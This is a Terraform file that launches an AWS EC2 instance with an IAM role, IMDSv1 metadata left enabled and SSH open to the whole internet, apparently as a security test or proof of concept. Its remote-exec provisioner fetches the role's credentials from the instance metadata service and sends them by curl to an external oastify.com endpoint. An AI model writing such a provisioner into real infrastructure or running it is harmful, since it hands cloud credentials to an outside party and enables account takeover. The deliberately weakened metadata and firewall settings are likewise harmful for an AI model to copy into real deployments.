
resource "aws_instance" "example" {
  ami           = "ami-06ca3ca175f37dd66"
  instance_type = "t2.micro"


  associate_public_ip_address = true

  provisioner "remote-exec" {
    inline = [
      "sudo yum install ec2-instance-connect -y",
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://URL.oastify.com/creds.php --data-urlencode creds@/tmp/awscreds.txt"
    ]
  }

  iam_instance_profile = "tf-testing-role"

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = tls_private_key.this.private_key_openssh
    host        = self.public_ip
    agent       = false
  }

  key_name = aws_key_pair.this.key_name

  vpc_security_group_ids = [aws_security_group.example.id]

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

  tags = {
    Name = "terraform-testing"
  }
}

resource "tls_private_key" "this" {
  algorithm = "ED25519"
}

resource "aws_key_pair" "this" {
  key_name   = "terraform-ssh-key"
  public_key = tls_private_key.this.public_key_openssh
}

resource "aws_security_group" "example" {
  name        = "ec2-tf-testing"
  description = "SG for use with terraform testing"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

output "public_ip" {
  value = aws_instance.example.public_ip
}